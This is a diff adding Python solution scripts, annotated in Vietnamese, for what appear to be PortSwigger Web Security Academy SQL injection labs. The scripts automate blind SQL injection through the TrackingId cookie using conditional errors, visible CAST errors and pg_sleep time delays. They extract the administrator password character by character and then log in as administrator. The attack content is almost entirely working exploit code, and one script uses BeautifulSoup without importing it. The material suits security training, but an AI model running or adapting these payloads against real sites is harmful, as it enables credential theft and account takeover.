@@ -552,6 +552,231 @@ response = session.post(login_url, data=data)
 print(f"Request sent to: {login_url}")
 if (response.status_code == 200):
     print("Login successful!")
-else:
-    print("Login failed!")
 ```
+
+# LAB 10: Blind SQL injection with conditional errors
+```python
+import requests
+from bs4 import BeautifulSoup
+
+print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
+url = input("Nhập URL: ").rstrip("/")
+
+response = requests.get(url)
+
+tracking_id = None
+if 'Set-Cookie' in response.headers:
+    cookies_header = response.headers['Set-Cookie']
+    cookie_parts = cookies_header.split(';')
+    for part in cookie_parts:
+        if part.strip().startswith('TrackingId='):
+            tracking_id = part.strip().split('=')[1]
+            break
+
+if tracking_id:
+    print(f"TrackingId: {tracking_id}")
+
+    charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
+    passw = ''
+
+    for index in range(1, 21):
+        found = False
+        for c in charset:
+            payload = f"{tracking_id}' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTR(password,{index},1) = '{c}') ||'"
+            cookies = {
+                "TrackingId": payload,
+                "session": "70ipyj4mj7XlFojaO9xMj1cbpoiewWAu"
+            }
+            print("Đang test ký tự thứ ",index," :",c,end="\r")
+
+            response2 = requests.get(url, cookies=cookies)
+
+            if response2.status_code == 500:
+                passw += c
+                found = True
+                print("\npass:", passw)
+                break
+
+        if not found:
+            print("Not found")
+            break
+
+login_url = f"{url}/login"
+
+session = requests.Session()
+response = session.get(login_url)
+
+if response.status_code != 200:
+    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
+    exit()
+
+soup = BeautifulSoup(response.text, "html.parser")
+csrf_token = soup.find("input", {"name": "csrf"})["value"]
+
+data = {
+    "csrf": csrf_token,
+    "username": "administrator",
+    "password": passw
+}
+
+response = session.post(login_url, data=data)
+
+if (response.status_code == 200):
+    print("Login successful!")
+```
+
+# LAB 11: Visible error-based SQL injection
+```python
+import requests
+import re
+
+print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
+url = input("Nhập URL: ").rstrip("/")
+
+payload = f"'AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
+
+cookies = {
+    "TrackingId": payload,
+    "session": "70ipyj4mj7XlFojaO9xMj1cbpoiewWAu"
+}
+
+response = requests.get(url, cookies=cookies)
+
+match = re.search(r'integer: "(.{20})"', response.text)
+
+if match:
+    password = match.group(1)
+else:
+    print("Không tìm thấy chuỗi phù hợp.")
+
+login_url = f"{url}/login"
+
+session = requests.Session()
+response = session.get(login_url)
+
+if response.status_code != 200:
+    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
+    exit()
+
+soup = BeautifulSoup(response.text, "html.parser")
+csrf_token = soup.find("input", {"name": "csrf"})["value"]
+
+data = {
+    "csrf": csrf_token,
+    "username": "administrator",
+    "password": password
+}
+
+response = session.post(login_url, data=data)
+
+if (response.status_code == 200):
+    print("Login successful!")
+```
+
+# LAB 12: Blind SQL injection with time delays
+```python
+import requests
+
+print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
+url = input("Nhập URL: ").rstrip("/")
+
+response = requests.get(url)
+
+tracking_id = None
+if 'Set-Cookie' in response.headers:
+    cookies_header = response.headers['Set-Cookie']
+    cookie_parts = cookies_header.split(';')
+    for part in cookie_parts:
+        if part.strip().startswith('TrackingId='):
+            tracking_id = part.strip().split('=')[1]
+            break
+
+if tracking_id:
+    print(f"TrackingId: {tracking_id}")
+
+    payload = f"{tracking_id}'|| pg_sleep(10)--"
+
+    cookies = {
+        "TrackingId": payload,
+        "session": "70ipyj4mj7XlFojaO9xMj1cbpoiewWAu" 
+    }
+    print("Đợi xíu xiu")
+    response2 = requests.get(url, cookies=cookies)
+
+print("Xong")
+```
+
+# LAB 12.5: Blind SQL injection with time delays and information retrieval
+```python
+import requests
+import time
+from bs4 import BeautifulSoup
+
+print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
+url = input("Nhập URL: ").rstrip("/")
+
+response = requests.get(url)
+
+tracking_id = None
+if 'Set-Cookie' in response.headers:
+    cookies_header = response.headers['Set-Cookie']
+    cookie_parts = cookies_header.split(';')
+    for part in cookie_parts:
+        if part.strip().startswith('TrackingId='):
+            tracking_id = part.strip().split('=')[1]
+            break
+
+if tracking_id:
+    print(f"TrackingId: {tracking_id}")
+
+    charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
+    passw = ''
+
+    for index in range(1, 21):
+        found = False
+        for c in charset:
+            payload = f"{tracking_id}' || (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password,{index},1) = '{c}') THEN pg_sleep(5) ELSE '' END FROM users)--"
+            cookies = {
+                "TrackingId": payload,
+            }
+            print("Đang test ký tự thứ ",index," :",c,end="\r")
+
+            start_time = time.time()
+            response2 = requests.get(url, cookies=cookies)
+            end_time = time.time()
+            response2_time = end_time - start_time
+
+            if response2_time > 5:
+                passw += c
+                found = True
+                print("\npass:", passw)
+                break
+
+        if not found:
+            print("Not found")
+            break
+
+login_url = f"{url}/login"
+
+session = requests.Session()
+response = session.get(login_url)
+
+if response.status_code != 200:
+    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
+    exit()
+
+soup = BeautifulSoup(response.text, "html.parser")
+csrf_token = soup.find("input", {"name": "csrf"})["value"]
+
+data = {
+    "csrf": csrf_token,
+    "username": "administrator",
+    "password": passw
+}
+
+response = session.post(login_url, data=data)
+
+if (response.status_code == 200):
+    print("Login successful!")
+```
+
